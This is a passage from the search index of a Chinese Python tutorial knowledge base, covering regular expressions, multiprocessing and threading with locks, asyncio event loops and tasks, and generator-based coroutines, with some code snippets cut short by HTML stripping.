m1 and m2: print('你输入的信息是有效的!') if __name__ == '__main__': main() 提示：上面在书写正则表达式时使用了“原始字符串”的写法（在字符串前面加上了r），所谓“原始字符串”就是字符串中的每个字符都是它原始的意义，说得更直接一点就是字符串中没有所谓的转义字符啦。因为正则表达式中有很多元字符和需要进行转义的地方，如果不使用原始字符串就需要将反斜杠写作\\，例如表示数字的\\d得书写成\\d，这样不仅写起来不方便，阅读的时候也会很吃力。 例子2：从一段文字中提取出国内手机号码。 import re def main(): # 创建正则表达式对象 使用了前瞻和回顾来保证手机号前后不应该出现数字 pattern = re.compile(r'(? 说明：上面匹配国内手机号的正则表达式并不够好，因为像14开头的号码只有145或147，而上面的正则表达式并没有考虑这种情况，要匹配国内手机号，更好的正则表达式的写法是：(?，国内最近好像有19和16开头的手机号了，但是这个暂时不在我们考虑之列。 例子3：替换字符串中的不良内容 import re def main(): sentence = '你丫是傻叉吗? 我操你大爷的. Fuck you.' purified = re.sub('[操肏艹]|fuck|shit|傻[比屄逼叉缺吊屌]|煞笔', '*', sentence, flags=re.IGNORECASE) print(purified) # 你丫是*吗? 我*你大爷的. * you. if __name__ == '__main__': main() 说明：re模块的正则表达式相关函数中都有一个flags参数，它代表了正则表达式的匹配标记，可以通过该标记来指定匹配时是否忽略大小写、是否进行多行匹配、是否显示调试信息等。如果需要为flags参数指定多个值，可以使用按位或运算符进行叠加，如flags=re.I | re.M。 例子4：拆分长字符串 import re def main(): poem = '窗前明月光，疑是地上霜。举头望明月，低头思故乡。' sentence_list = re.split(r'[，。, .]', poem) while '' in sentence_list: sentence_list.remove('') print(sentence_list) # ['窗前明月光', '疑是地上霜', '举头望明月', '低头思故乡'] if __name__ == '__main__': main() 后话 如果要从事爬虫类应用的开发，那么正则表达式一定是一个非常好的助手，因为它可以帮助我们迅速的从网页代码中发现某种我们指定的模式并提取出我们需要的信息，当然对于初学者来收，要编写一个正确的适当的正则表达式可能并不是一件容易的事情（当然有些常用的正则表达式可以直接在网上找找），所以实际开发爬虫应用的时候，有很多人会选择Beautiful Soup或Lxml来进行匹配和信息的提取，前者简单方便但是性能较差，后者既好用性能也好，但是安装稍嫌麻烦，这些内容我们会在后期的爬虫专题中为大家介绍 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2020-03-20 22:15:44 "},"知识库/04.编程开发/02.Python/10-进程与线程.html":{"url":"知识库/04.编程开发/02.Python/10-进程与线程.html","title":"10-进程与线程","keywords":"","body":"进程与线程 今天我们使用的计算机早已进入多CPU或多核时代，而我们使用的操作系统都是支持“多任务”的操作系统，这使得我们可以同时运行多个程序，也可以将一个程序分解为若干个相对独立的子任务，让多个子任务并发的执行，从而缩短程序的执行时间，同时也让用户获得更好的体验。因此在当下不管是用什么编程语言进行开发，实现让程序同时执行多个任务也就是常说的“并发编程”，应该是程序员必备技能之一。为此，我们需要先讨论两个概念，一个叫进程，一个叫线程。 概念 进程就是操作系统中执行的一个程序，操作系统以进程为单位分配存储空间，每个进程都有自己的地址空间、数据栈以及其他用于跟踪进程执行的辅助数据，操作系统管理所有进程的执行，为它们合理的分配资源。进程可以通过fork或spawn的方式来创建新的进程来执行其他的任务，不过新的进程也有自己独立的内存空间，因此必须通过进程间通信机制（IPC，Inter-Process Communication）来实现数据共享，具体的方式包括管道、信号、套接字、共享内存区等。 一个进程还可以拥有多个并发的执行线程，简单的说就是拥有多个可以获得CPU调度的执行单元，这就是所谓的线程。由于线程在同一个进程下，它们可以共享相同的上下文，因此相对于进程而言，线程间的信息共享和通信更加容易。当然在单核CPU系统中，真正的并发是不可能的，因为在某个时刻能够获得CPU的只有唯一的一个线程，多个线程共享了CPU的执行时间。使用多线程实现并发编程为程序带来的好处是不言而喻的，最主要的体现在提升程序的性能和改善用户体验，今天我们使用的软件几乎都用到了多线程技术，这一点可以利用系统自带的进程监控工具 当然多线程也并不是没有坏处，站在其他进程的角度，多线程的程序对其他程序并不友好，因为它占用了更多的CPU执行时间，导致其他程序无法获得足够的CPU执行时间；另一方面，站在开发者的角度，编写和调试多线程的程序都对开发者有较高的要求，对于初学者来说更加困难。 Python既支持多进程又支持多线程，因此使用Python实现并发编程主要有3种方式：多进程、多线程、多进程+多线程 Python中的多进程 Unix和Linux操作系统上提供了fork()系统调用来创建进程，调用fork()函数的是父进程，创建出的是子进程，子进程是父进程的一个拷贝，但是子进程拥有自己的PID。fork()函数非常特殊它会返回两次，父进程中可以通过fork()函数的返回值得到子进程的PID，而子进程中的返回值永远都是0。Python的os模块提供了fork()函数。由于Windows系统没有fork()调用，因此要实现跨平台的多进程编程，可以使用multiprocessing模块的Process类来创建子进程，而且该模块还提供了更高级的封装，例如批量启动进程的进程池（Pool）、用于进程间通信的队列（Queue）和管道（Pipe）等 下面用一个下载文件的例子来说明使用多进程和不使用多进程到底有什么差别，先看看下面的代码 from random import randint from time import sleep, time def downloadTask(name): print('开始下载%s.....' % name) time_to_download = randint(5, 10) sleep(time_to_download) print('%s下载完成!耗费%d秒' % (name, time_to_download)) def main(): startTime = time() downloadTask('abc') downloadTask('678') endTime = time() print('总共花费%d秒' % (endTime-startTime)) if __name__ == \"__main__\": main() 下面是运行程序得到的一次运行结果 开始下载abc..... abc下载完成!耗费8秒 开始下载678..... 678下载完成!耗费10秒 总共花费18秒 从上面的例子可以看出，如果程序中的代码只能按顺序一点点的往下执行，那么即使执行两个毫不相关的下载任务，也需要先等待一个文件下载完成后才能开始下一个下载任务，很显然这并不合理也没有效率。接下来我们使用多进程的方式将两个下载任务放到不同的进程中，代码如下所示 from multiprocessing import Process from os import getpid from random import randint from time import sleep, time def downloadTask(name): print('开始下载%s,进程号[%d].....' % (name, getpid())) time_to_download = randint(5, 10) sleep(time_to_download) print('%s下载完成!耗费%d秒' % (name, time_to_download)) def main(): startTime = time() p1 = Process(target=downloadTask, args=('abc',)) p1.start() p2 = Process(target=downloadTask, args=('678',)) p2.start() p1.join() p2.join() endTime = time() print('总共花费%d秒' % (endTime-startTime)) if __name__ == \"__main__\": main() 在上面的代码中，我们通过Process类创建了进程对象，通过target参数我们传入一个函数来表示进程启动后要执行的代码，后面的args是一个元组，它代表了传递给函数的参数。Process对象的start方法用来启动进程，而join方法表示等待进程执行结束。运行上面的代码可以明显发现两个下载任务“同时”启动了，而且程序的执行时间将大大缩短，不再是两个任务的时间总和。下面是程序的一次执行结果。 开始下载abc,进程号[9252]..... 开始下载678,进程号[15132]..... 678下载完成!耗费5秒 abc下载完成!耗费9秒 总共花费9秒 我们也可以使用subprocess模块中的类和函数来创建和启动子进程，然后通过管道来和子进程通信，这些内容我们不在此进行讲解，有兴趣的读者可以自己了解这些知识。接下来我们将重点放在如何实现两个进程间的通信。我们启动两个进程，一个输出Ping，一个输出Pong，两个进程输出的Ping和Pong加起来一共10个。听起来很简单吧，但是如果这样写可是错的哦 from multiprocessing import Process from time import sleep counter = 0 def sub_task(string): global counter while counter 看起来没毛病，但是最后的结果是Ping和Pong各输出了10个，Why？当我们在程序中创建进程的时候，子进程复制了父进程及其所有的数据结构，每个子进程有自己独立的内存空间，这也就意味着两个子进程中各有一个counter变量，所以结果也就可想而知了。要解决这个问题比较简单的办法是使用multiprocessing模块中的Queue类，它是可以被多个进程共享的队列，底层是通过管道和信号量（semaphore）机制来实现的，有兴趣的读者可以自己尝试一下。 from multiprocessing import Process, Queue from time import sleep def sub_task(string, q): number = q.get() while number: print('%d: %s' % (number, string)) sleep(0.001) number = q.get() def main(): q = Queue(10) for number in range(1, 11): q.put(number) p1 = Process(target=sub_task, args=('Ping', q)) p1.start() p2 = Process(target=sub_task, args=('Pong', q)) p2.start() if __name__ == '__main__': main() ''' @Description: 创建进程共享 @Version: 1.0 @Autor: AaronLuo @Date: 2020-03-24 20:53:23 @LastEditors: AaronLuo @LastEditTime: 2020-03-25 20:03:48 ''' import multiprocessing import os def sub_task(queue): print('子进程进程号:', os.getpid()) counter = 0 while counter ''' @Description: 创建进程调用其他程序 @Version: 1.0 @Autor: AaronLuo @Date: 2020-03-24 20:53:23 @LastEditors: AaronLuo @LastEditTime: 2020-03-25 20:31:58 ''' import subprocess import sys def main(): # 通过sys.argv获取命令行参数 if len(sys.argv) > 1: # 第一个命令行参数是程序本身所以从第二个开始取 for index in range(1, len(sys.argv)): try: # 通过subprocess模块的call函数启动子进程 # status = subprocess.call(index) status = subprocess.call(sys.argv[index]) except Exception as e: print(e) else: print('请使用命令行参数指定要执行的进程') if __name__ == '__main__': main() Python中的多线程 在Python早期的版本中就引入了thread模块（现在名为_thread）来实现多线程编程，然而该模块过于底层，而且很多功能都没有提供，因此目前的多线程开发我们推荐使用threading模块，该模块对多线程编程提供了更好的面向对象的封装。我们把刚才下载文件的例子用多线程的方式来实现一遍 ''' @Description: 线程 @Version: 1.0 @Autor: AaronLuo @Date: 2020-03-24 20:53:23 @LastEditors: AaronLuo @LastEditTime: 2020-03-25 20:46:06 ''' from random import randint from threading import Thread from time import time, sleep def download(filename): print('开始下载%s...' % filename) time_download = randint(5, 10) sleep(time_download) print('%s下载共花费%d秒' % (filename, time_download)) def main(): startTime = time() t1 = Thread(target=download, args=('Python从入门到住院.pdf',)) t1.start() t2 = Thread(target=download, args=('Peking Hot.avi',)) t2.start() t1.join() t2.join() endTime = time() print('共花费%d秒' % (endTime - startTime)) if __name__ == \"__main__\": main() 我们可以直接使用threading模块的Thread类来创建线程，但是我们之前讲过一个非常重要的概念叫“继承”，我们可以从已有的类创建新类，因此也可以通过继承Thread类的方式来创建自定义的线程类，然后再创建线程对象并启动线程。代码如下所示 ''' @Description: 线程 @Version: 1.0 @Autor: AaronLuo @Date: 2020-03-24 20:53:23 @LastEditors: AaronLuo @LastEditTime: 2020-03-25 20:51:30 ''' from random import randint from threading import Thread from time import time, sleep class DownloadTask(Thread): def __init__(self, filename): super().__init__() self.filename = filename def run(self): print('%s开始下载' % self.filename) time_to_download = randint(5, 10) sleep(time_to_download) print('%s下载成功！共花费%d秒' % (self.filename, time_to_download)) def main(): startTime = time() t1 = DownloadTask('python从入门到住院.pdf') t1.start() t2 = DownloadTask('Iron Man.avi') t2.start() t1.join() t2.join() endTime = time() print('共花费%d秒' % (endTime - startTime)) if __name__ == \"__main__\": main() 因为多个线程可以共享进程的内存空间，因此要实现多个线程间的通信相对简单，大家能想到的最直接的办法就是设置一个全局变量，多个线程共享这个全局变量即可。但是当多个线程共享同一个变量（我们通常称之为“资源”）的时候，很有可能产生不可控的结果从而导致程序失效甚至崩溃。如果一个资源被多个线程竞争使用，那么我们通常称之为“临界资源”，对“临界资源”的访问需要加上保护，否则资源会处于“混乱”的状态。下面的例子演示了100个线程向同一个银行账户转账（转入1元钱）的场景，在这个例子中，银行账户就是一个临界资源，在没有保护的情况下我们很有可能会得到错误的结果。 ''' @Description: 线程 @Version: 1.0 @Autor: AaronLuo @Date: 2020-03-24 20:53:23 @LastEditors: AaronLuo @LastEditTime: 2020-03-25 21:20:18 ''' from threading import Thread from time import sleep class Account(): def __init__(self): super().__init__() self._balance = 0 def deposit(self, money): newmoney = self._balance + money sleep(0.01) self._balance = newmoney @property def money(self): return self._balance class AddMoneyThread(Thread): def __init__(self, account, money): super().__init__() self._account = account self._money = money def run(self): self._account.deposit(self._money) def main(): account = Account() threads = [] for _ in range(100): t = AddMoneyThread(account, 1) threads.append(t) t.start() for index in threads: index.join() print('共存储%d元' % account.money) if __name__ == \"__main__\": main() 运行上面的程序，结果让人大跌眼镜，100个线程分别向账户中转入1元钱，结果居然远远小于100元。之所以出现这种情况是因为我们没有对银行账户这个“临界资源”加以保护，多个线程同时向账户中存钱时，会一起执行到new_balance = self._balance + money这行代码，多个线程得到的账户余额都是初始状态下的0，所以都是0上面做了+1的操作，因此得到了错误的结果。在这种情况下，“锁”就可以派上用场了。我们可以通过“锁”来保护“临界资源”，只有获得“锁”的线程才能访问“临界资源”，而其他没有得到“锁”的线程只能被阻塞起来，直到获得“锁”的线程释放了“锁”，其他线程才有机会获得“锁”，进而访问被保护的“临界资源”。下面的代码演示了如何使用“锁”来保护对银行账户的操作，从而获得正确的结果。 ''' @Description: 线程+锁 @Version: 1.0 @Autor: AaronLuo @Date: 2020-03-24 20:53:23 @LastEditors: AaronLuo @LastEditTime: 2020-03-25 22:15:58 ''' from random import randint from threading import Thread, Lock from time import time, sleep class Account(): def __init__(self): super().__init__() self._balance = 0 self._lock = Lock() def deposit(self, money): self._lock.acquire() try: newmoney = self._balance + money sleep(0.01) self._balance = newmoney except Exception as e: print(e) finally: self._lock.release() @property def money(self): return self._balance class AddMoneyThread(Thread): def __init__(self, account, money): super().__init__() self._account = account self._money = money def run(self): self._account.deposit(self._money) def main(): account = Account() threads = [] for _ in range(100): t = AddMoneyThread(account, 1) threads.append(t) t.start() for index in threads: index.join() print('共存储%d元' % account.money) if __name__ == \"__main__\": main() 比较遗憾的一件事情是Python的多线程并不能发挥CPU的多核特性，这一点只要启动几个执行死循环的线程就可以得到证实了。之所以如此，是因为Python的解释器有一个“全局解释器锁”（GIL）的东西，任何线程执行前必须先获得GIL锁，然后每执行100条字节码，解释器就自动释放GIL锁，让别的线程有机会执行，这是一个历史遗留问题，但是即便如此，就如我们之前举的例子，使用多线程在提升执行效率和改善用户体验方面仍然是有积极意义的 多进程还是多线程 无论是多进程还是多线程，只要数量一多，效率肯定上不去，为什么呢？我们打个比方，假设你不幸正在准备中考，每天晚上需要做语文、数学、英语、物理、化学这5科的作业，每项作业耗时1小时。如果你先花1小时做语文作业，做完了，再花1小时做数学作业，这样，依次全部做完，一共花5小时，这种方式称为单任务模型。如果你打算切换到多任务模型，可以先做1分钟语文，再切换到数学作业，做1分钟，再切换到英语，以此类推，只要切换速度足够快，这种方式就和单核CPU执行多任务是一样的了，以旁观者的角度来看，你就正在同时写5科作业。 但是，切换作业是有代价的，比如从语文切到数学，要先收拾桌子上的语文书本、钢笔（这叫保存现场），然后，打开数学课本、找出圆规直尺（这叫准备新环境），才能开始做数学作业。操作系统在切换进程或者线程时也是一样的，它需要先保存当前执行的现场环境（CPU寄存器状态、内存页等），然后，把新任务的执行环境准备好（恢复上次的寄存器状态，切换内存页等），才能开始执行。这个切换过程虽然很快，但是也需要耗费时间。如果有几千个任务同时进行，操作系统可能就主要忙着切换任务，根本没有多少时间去执行任务了，这种情况最常见的就是硬盘狂响，点窗口无反应，系统处于假死状态。所以，多任务一旦多到一个限度，反而会使得系统性能急剧下降，最终导致所有任务都做不好。 是否采用多任务的第二个考虑是任务的类型，可以把任务分为计算密集型和I/O密集型。计算密集型任务的特点是要进行大量的计算，消耗CPU资源，比如对视频进行编码解码或者格式转换等等，这种任务全靠CPU的运算能力，虽然也可以用多任务完成，但是任务越多，花在任务切换的时间就越多，CPU执行任务的效率就越低。计算密集型任务由于主要消耗CPU资源，这类任务用Python这样的脚本语言去执行效率通常很低，最能胜任这类任务的是C语言，我们之前提到了Python中有嵌入C/C++代码的机制。 除了计算密集型任务，其他的涉及到网络、存储介质I/O的任务都可以视为I/O密集型任务，这类任务的特点是CPU消耗很少，任务的大部分时间都在等待I/O操作完成（因为I/O的速度远远低于CPU和内存的速度）。对于I/O密集型任务，如果启动多任务，就可以减少I/O等待时间从而让CPU高效率的运转。有一大类的任务都属于I/O密集型任务，这其中包括了我们很快会涉及到的网络应用和Web应用。 单线程+异步I/O 现代操作系统对I/O操作的改进中最为重要的就是支持异步I/O。如果充分利用操作系统提供的异步I/O支持，就可以用单进程单线程模型来执行多任务，这种全新的模型称为事件驱动模型。Nginx就是支持异步I/O的Web服务器，它在单核CPU上采用单进程模型就可以高效地支持多任务。在多核CPU上，可以运行多个进程（数量与CPU核心数相同），充分利用多核CPU。用Node.js开发的服务器端程序也使用了这种工作模式，这也是当下实现多任务编程的一种趋势。 在Python语言中，单线程+异步I/O的编程模型称为协程，有了协程的支持，就可以基于事件驱动编写高效的多任务程序。协程最大的优势就是极高的执行效率，因为子程序切换不是线程切换，而是由程序自身控制，因此，没有线程切换的开销。协程的第二个优势就是不需要多线程的锁机制，因为只有一个线程，也不存在同时写变量冲突，在协程中控制共享资源不用加锁，只需要判断状态就好了，所以执行效率比多线程高很多。如果想要充分利用CPU的多核特性，最简单的方法是多进程+协程，既充分利用多核，又充分发挥协程的高效率，可获得极高的性能。关于这方面的内容，我稍后会做一个专题来进行讲解。 应用案例 例子1：将耗时间的任务放到线程中以获得更好的用户体验。 如下所示的界面中，有“下载”和“关于”两个按钮，用休眠的方式模拟点击“下载”按钮会联网下载文件需要耗费10秒的时间，如果不使用“多线程”，我们会发现，当点击“下载”按钮后整个程序的其他部分都被这个耗时间的任务阻塞而无法执行了，这显然是非常糟糕的用户体验，代码如下所示。 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2020-03-25 22:21:32 "},"知识库/04.编程开发/02.Python/11.Python asyncio.html":{"url":"知识库/04.编程开发/02.Python/11.Python asyncio.html","title":"11.Python asyncio","keywords":"","body":"Python Asyncio 参考文档 Asyncio是用来实现异步网络操作，并发，协程 Asyncio关键字 event_loop 事件循环 程序开启一个事件队列，把一些函数注册到事件队列中，当满足事件发生的条件，调用相应的协程函数 coroutine 协程 协程对象，指一个使用async关键字定义的函数，当调用函数时，不会立即执行函数，而是返回一个协程对象。协程对象需要注册到事件队列中，由事件队列调用 task 任务 一个协程对象就是一个原生可以挂起的函数，任务则是对协程进一步封装，其中包含了任务的各种状态 future 代表将来执行或没有执行的的任务结果，它与task没有本质上的区别 async/await 关键字，python3.5+用于定义协程的关键字，async定义一个协程，await用于挂起阻塞异步调用接口 定义一个协程 使用async关键字定义协程 from time import time import asyncio async def f(): print(\"i'm coroutine\") start = time() coroutine = f() # 获取一个事件loop loop = asyncio.get_event_loop() # 将协程加入到事件队列中 loop.run_until_complete(coroutine) end = time() print('Time:{}'.format(end-start)) async关键字定义一个协程，使用get_event_loop()方法获取当前主线程的事件loop；再使用run_until_complete(coroutine)将协程注册到事件队列中，并启用事件轮循。 创建task 协程对象不能直接运行，当注册到事件队列中，其实是run_until_complete(coroutine)将协程封装成一个task任务，用于保存协程的状态，以及未来获取协程结果 from time import time import asyncio async def f(): print(\"i'm coroutine\") return \"return i'm coroutine\" start = time() coroutine = f() # 获取当前主线程的事件轮循队列 loop = asyncio.get_event_loop() # 创建任务 task = loop.create_task(coroutine) # 执行任务 loop.run_until_complete(task) print(task) print(task.result()) end = time() print('it takes %d seconds' % (end-start)) 创建task后，在task加入事件循环之前为pending状态，当完成后，状态为finished 关于上面通过loop.create_task(coroutine)创建task,同样的可以通过 asyncio.ensure_future(coroutine)创建task 绑定回调 绑定回调，在task执行完成的时候可以获取执行的结果，回调的最后一个参数是future对象，通过该对象可以获取协程返回值 from time import time import asyncio async def f(): print(\"i'm coroutine\") return \"return i'm coroutine\" def callback(future): print('result is {}'.format(future.result())) start = time() coroutine = f() # 获取当前主线程的事件轮循队列 loop = asyncio.get_event_loop() # 创建任务 task = loop.create_task(coroutine) # 绑定回调函数 task.add_done_callback(callback) # 执行任务 loop.run_until_complete(task) print(task) end = time() print('it takes %d seconds' % (end-start)) 通过add_done_callback方法给task任务添加回调函数，当task（也可以说是coroutine）执行完成的时候,就会调用回调函数。并通过参数future获取协程执行的结果。这里我们创建 的task和回调里的future对象实际上是同一个对象 阻塞和await 使用async可以定义一个协程，使用await可以针对耗时操作进行挂起，就像生成器的yield，函数让出控制权。协程遇到await，事件轮循会挂起该协程，执行别的协程，直到协程也挂起或者执行完成，再进行下一个协程的执行 耗时的一般是IO操作，例如网络请求，文件读取。模拟IO操作，使用async.sleep()模拟IO操作，协程的目的也是让IO操作异步化 from time import time import asyncio async def f(): print(\"i'm coroutine\") await asyncio.sleep(2) return \"return i'm coroutine\" # def callback(future): # print('result is {}'.format(future.result())) start = time() coroutine = f() # 获取当前主线程的事件轮循队列 loop = asyncio.get_event_loop() # 创建任务 task = loop.create_task(coroutine) # 执行任务 loop.run_until_complete(task) print(task.result()) end = time() print('it takes %d seconds' % (end-start)) 并发和并行 并发是指具有多个活动的系统 并行是指用并发使一个系统运行得更快，并行可以在操作系统的多个抽象层次进行运用 所以并行通常是指有多个任务同时进行，并行则是在同一时刻有多个任务同时进行 from time import time import asyncio async def f(x): print(\"i'm coroutine{}\".format(x)) await asyncio.sleep(2) return \"return i'm coroutine{}\".format(x) # def callback(future): # print('result is {}'.format(future.result())) start = time() coroutine = f(1) coroutine1 = f(2) coroutine2 = f(3) # 获取当前主线程的事件轮循队列 loop = asyncio.get_event_loop() # 创建任务列表 tasks = [asyncio.ensure_future(coroutine), asyncio.ensure_future( coroutine1), asyncio.ensure_future(coroutine2)] # 执行任务 loop.run_until_complete(asyncio.wait(tasks)) for task in tasks: print('result is {}'.format(task.result())) end = time() print('it takes %d seconds' % (end-start)) 运行结果 i'm coroutine1 i'm coroutine2 i'm coroutine3 result is return i'm coroutine1 result is return i'm coroutine2 result is return i'm coroutine3 it takes 2 seconds 总共时间为2s。2s阻塞时间，所有协程执行完毕，如果是同步执行，至少需要7s。此时运用asyncio模块实现了并发，asyncio.wait(tasks)也可以使用async.gather(*tasks)，前者接受一个列表，后者接收一堆task 协程嵌套 使用async可以定义协程，协程用于耗时的io操作，我们也可以封装更多的io操作过程，这样就实现了嵌套的协程，即一个协程中await了另外一个协程，如此连接起来 单任务 from time import time import asyncio async def f(x): print(\"i'm coroutine{}\".format(x)) await asyncio.sleep(2) return \"return i'm coroutine{}\".format(x) # def callback(future): # print('result is {}'.format(future.result())) async def main(): coroutine = f(1) result = await coroutine print(result) start = time() loop = asyncio.get_event_loop() loop.run_until_complete(main()) end = time() print('time is {}'.format(end-start)) 运行结果 i'm coroutine1 return i'm coroutine1 time is 2.015313148498535 当在main这个协成里，等待协程f()的return结果，可以使用await f(1)等待执行的结果，并将其赋值给result 多任务 from time import time import asyncio async def f(x): print(\"i'm coroutine{}\".format(x)) await asyncio.sleep(2) return \"return i'm coroutine{}\".format(x) async def main(): coroutine = f(1) coroutine1 = f(2) coroutine2 = f(3) tasks = [asyncio.ensure_future(coroutine), asyncio.ensure_future( coroutine1), asyncio.ensure_future(coroutine2)] dones, pendings = await asyncio.wait(tasks) for result in dones: print(result.result()) start = time() loop = asyncio.get_event_loop() loop.run_until_complete(main()) end = time() print('time is {}'.format(end-start)) 多任务中，要使用asyncio.wait()并发执行任务，当协程完成之后，使用dones，pendings，dones，pendings类型是集合，若是一个参数，则返回的是一个元组，元组中没有result()方法 运行结果 i'm coroutine1 i'm coroutine2 i'm coroutine3 return i'm coroutine1 return i'm coroutine2 return i'm coroutine3 time is 2.012080430984497 使用asyncio.gather(*tasks)会将结果保存至一个List中 from time import time import asyncio async def f(x): print(\"i'm coroutine{}\".format(x)) await asyncio.sleep(2) return \"return i'm coroutine{}\".format(x) async def main(): coroutine = f(1) coroutine1 = f(2) coroutine2 = f(3) tasks = [asyncio.ensure_future(coroutine), asyncio.ensure_future( coroutine1), asyncio.ensure_future(coroutine2)] dones, pendings = await asyncio.wait(tasks) for result in dones: print(result.result()) start = time() loop = asyncio.get_event_loop() loop.run_until_complete(main()) end = time() print('time is {}'.format(end-start)) 运行结果 i'm coroutine1 i'm coroutine2 i'm coroutine3 [\"return i'm coroutine1\", \"return i'm coroutine2\", \"return i'm coroutine3\"] return i'm coroutine1 return i'm coroutine2 return i'm coroutine3 time is 2.0033509731292725 不在main协程函数里处理结果，直接返回await的内容，那么最外层的run_until_complete将会返回main协程的结果。 将上述的代码更改为： from time import time import asyncio async def f(x): print(\"i'm coroutine{}\".format(x)) await asyncio.sleep(2) return \"return i'm coroutine{}\".format(x) async def main(): coroutine = f(1) coroutine1 = f(2) coroutine2 = f(3) tasks = [asyncio.ensure_future(coroutine), asyncio.ensure_future( coroutine1), asyncio.ensure_future(coroutine2)] return await asyncio.gather(*tasks) start = time() loop = asyncio.get_event_loop() results = loop.run_until_complete(main()) for result in results: print(result) end = time() print('time is {}'.format(end-start)) 运行结果 i'm coroutine1 i'm coroutine2 i'm coroutine3 return i'm coroutine1 return i'm coroutine2 return i'm coroutine3 time is 2.0101969242095947 或者使用asyncio.wait(tasks)将任务挂起，再从已完成的协程中读取result()值 from time import time import asyncio async def f(x): print(\"i'm coroutine{}\".format(x)) await asyncio.sleep(2) return \"return i'm coroutine{}\".format(x) # def callback(future): # print('result is {}'.format(future.result())) async def main(): coroutine = f(1) coroutine1 = f(2) coroutine2 = f(3) tasks = [asyncio.ensure_future(coroutine), asyncio.ensure_future( coroutine1), asyncio.ensure_future(coroutine2)] return await asyncio.wait(tasks) start = time() loop = asyncio.get_event_loop() dones, pendings = loop.run_until_complete(main()) for result in dones: print(result.result()) end = time() print('time is {}'.format(end-start)) 也可以使用asyncio.as_computed from time import time import asyncio async def f(x): print(\"i'm coroutine{}\".format(x)) await asyncio.sleep(2) return \"return i'm coroutine{}\".format(x) # def callback(future): # print('result is {}'.format(future.result())) async def main(): coroutine = f(1) coroutine1 = f(2) coroutine2 = f(3) tasks = [asyncio.ensure_future(coroutine), asyncio.ensure_future( coroutine1), asyncio.ensure_future(coroutine2)] for task in asyncio.as_completed(tasks): print(await task) start = time() loop = asyncio.get_event_loop() loop.run_until_complete(main()) end = time() print('time is {}'.format(end-start)) 协程的停止 future对象有几个状态： Pending Running Done Cacelled from time import time import asyncio async def f(x): print(\"i'm coroutine{}\".format(x)) await asyncio.sleep(x) return \"return i'm coroutine{}\".format(x) # def callback(future): # print('result is {}'.format(future.result())) async def main(): coroutine = f(1) coroutine1 = f(2) coroutine2 = f(3) tasks = [asyncio.ensure_future(coroutine), asyncio.ensure_future( coroutine1), asyncio.ensure_future(coroutine2)] return await asyncio.gather(*tasks) try: start = time() loop = asyncio.get_event_loop() result = loop.run_until_complete(main()) for item in result: print(item) end = time() print('time is {}'.format(end-start)) except KeyboardInterrupt: print(asyncio.Task.all_tasks()) for item in asyncio.Task.all_tasks(): print(item.cancel()) loop.stop() loop.run_forever() finally: loop.close() 启动事件循环之后，马上ctrl+c，会触发run_until_complete的执行异常 KeyBorardInterrupt。然后通过循环asyncio.Task取消future。可以看到输出如下： 运行结果 i'm coroutine1 i'm coroutine2 i'm coroutine3 { wait_for=()]>>, result=\"return i'm coroutine1\">, wait_for=()]> cb=[gather.._done_callback() at C:\\Python3\\lib\\asyncio\\tasks.py:691]>, wait_for=()]> cb=[gather.._done_callback() at C:\\Python3\\lib\\asyncio\\tasks.py:691]>} True False True True True表示cannel成功，loop stop之后还需要再次开启事件循环，最后在close，不然还会抛出异常 循环task，逐个cancel是一种方案，可是正如上面我们把task的列表封装在main函数中，main函数外进行事件循环的调用。这个时候，main相当于最外出的一个task，那么处理包装的main函数即可。 不同线程的事件轮循 很多时候，我们的事件循环用于注册协程，而有的协程需要动态的添加到事件循环中。一个简单的方式就是使用多线程。当前线程创建一个事件循环，然后在新建一个线程，在新线程中启动事件循环。当前线程不会被block。 import asyncio from threading import Thread import time def now(): return time.time() def start_loop(loop): asyncio.set_event_loop(loop) loop.run_forever() def more_work(x): print('More work {}'.format(x)) time.sleep(x) print('Finished more work {}'.format(x)) start = now() new_loop = asyncio.new_event_loop() t = Thread(target=start_loop, args=(new_loop,)) t.start() print('TIME: {}'.format(time.time() - start)) new_loop.call_soon_threadsafe(more_work, 6) new_loop.call_soon_threadsafe(more_work, 3) 启动上述代码之后，当前线程不会被block，新线程中会按照顺序执行call_soon_threadsafe方法注册的more_work方法， 后者因为time.sleep操作是同步阻塞的，因此运行完毕more_work需要大致6 + 3 新线程协程 import asyncio import time from threading import Thread now = lambda :time.time() def start_loop(loop): asyncio.set_event_loop(loop) loop.run_forever() async def do_some_work(x): print('Waiting {}'.format(x)) await asyncio.sleep(x) print('Done after {}s'.format(x)) start = now() new_loop = asyncio.new_event_loop() t = Thread(target=start_loop, args=(new_loop,)) t.start() print('TIME: {}'.format(time.time() - start)) asyncio.run_coroutine_threadsafe(do_some_work(6), new_loop) asyncio.run_coroutine_threadsafe(do_some_work(4), new_loop) 上述的例子，主线程中创建一个new_loop，然后在另外的子线程中开启一个无限事件循环。 主线程通过run_coroutine_threadsafe新注册协程对象。这样就能在子线程中进行事件循环的并发操作，同时主线程又不会被block。一共执行的时间大概在6s左右 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2020-03-27 00:13:22 "},"知识库/04.编程开发/02.Python/12.Python协程深入理解.html":{"url":"知识库/04.编程开发/02.Python/12.Python协程深入理解.html","title":"12.Python协程深入理解","keywords":"","body":"Python 协程深入理解 从语法上来看，协程和生成器类似，都是定义体中包含yield关键字的函数。 yield在协程中的用法： 在协程中yield通常出现在表达式的右边，例如：datum = yield,可以产出值，也可以不产出--如果yield关键字后面没有表达式，那么生成器产出None. 协程可能从调用方接受数据，调用方是通过send(datum)的方式把数据提供给协程使用，而不是next(...)函数，通常调用方会把值推送给协程。 协程可以把控制器让给中心调度程序，从而激活其他的协程 所以总体上在协程中把yield看做是控制流程的方式 了解协程的过程 def simple_coroutine(): print('coroutine start') x = yield print('coroutine received :', x) my_coro = simple_coroutine() next(my_coro) my_coro.send(10) 运行结果 coroutine start coroutine received : 10 Traceback (most recent call last): File \"d:\\Code\\Python\\day6\\app.py\", line 19, in my_coro.send(10) StopIteration yield右边没有没有表达式，默认产出的值是None，刚开始调用next()方法，目的在于激活协程，程序就会运行到x = yield处，这里需要注意，这里程序运行到x = yield处，并没有将值赋值给x，而是计算yield 后面的值表达式，然后返回给next()方法，当这个生成器send()一个值给协程之后，从暂定处yield将send的这个值赋值给x,然后继续运行，直到运行到下一个yield处。 当程序运行到最后，会自动抛出一个StopIteration的异常，当捕获异常之后，可以找到这个生成器最后的值 def simple_coroutine(): print('coroutine start') x = yield print('coroutine received :', x) try: my_coro = simple_coroutine() next(my_coro) my_coro.send(10) except StopIteration as 